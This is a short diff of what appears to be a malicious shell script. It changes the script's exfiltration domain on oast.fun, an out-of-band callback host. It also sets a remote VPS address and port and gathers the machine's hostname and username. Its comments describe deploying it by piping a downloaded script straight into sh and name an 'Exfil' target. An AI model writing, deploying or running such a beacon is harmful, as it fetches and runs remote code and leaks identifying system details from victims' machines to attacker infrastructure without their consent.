@@ -3,7 +3,7 @@
 # Deploy: curl -sL URL | sh
 # Exfil: amtfxylissimhrzasyemb6vqffp0rmeus.oast.fun
 
-OAST="amtfxylissimhrzasyemb6vqffp0rmeus.oast.fun"
+OAST="fzxlsopmyfsfmcutpfapj7u3fu0t92jtj.oast.fun"
 VPS="153.75.248.248:9999"
 HOST=$(hostname 2>/dev/null || cat /etc/hostname 2>/dev/null || echo "u")
 USER=$(whoami 2>/dev/null || id -un 2>/dev/null || echo "u")
